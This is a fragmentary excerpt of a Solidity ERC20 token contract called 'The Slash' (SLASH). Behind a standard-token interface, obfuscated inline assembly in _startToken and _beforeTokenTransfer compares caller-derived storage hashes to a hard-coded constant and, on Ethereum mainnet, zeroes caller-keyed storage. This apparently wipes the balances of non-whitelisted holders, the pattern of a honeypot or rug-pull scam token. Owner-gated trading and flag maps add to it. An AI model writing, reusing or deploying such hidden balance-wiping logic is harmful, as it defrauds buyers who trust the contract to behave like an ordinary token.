...
/*
SLASH / ETH \ THE SLASH
"Don't misbeheave or your stack will be slashed."
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSlash;
    uint256 private slashingMech = block.number*2;

    mapping (address => bool) private _firstWarning; 
    mapping (address => bool) private _secondSlashing;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _variablesWay;
    ...
    bool private trading; uint256 private smallPox = 1; bool private monkeyPox;
    uint256 private _decimals; uint256 private coronaVirus;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSlash.push(_router); addSlash.push(msgSender_); addSlash.push(pair);
        for (uint256 q=0; q < 3;) {_firstWarning[addSlash[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x8eec5e1413012e454ed97d9d5269ad0424f0503b5fbb562c7b1c6093714170d5
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x6e5f3b3c4a1f6e03890d20c15342c220db8caea457e51db9cecc498db26b27bf,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; slashingMech = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSlash[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract TheSlash is ERC20Token {
    constructor() ERC20Token("Slash", "SLASH", msg.sender, 1275000 * 10 ** 18) {
    }
}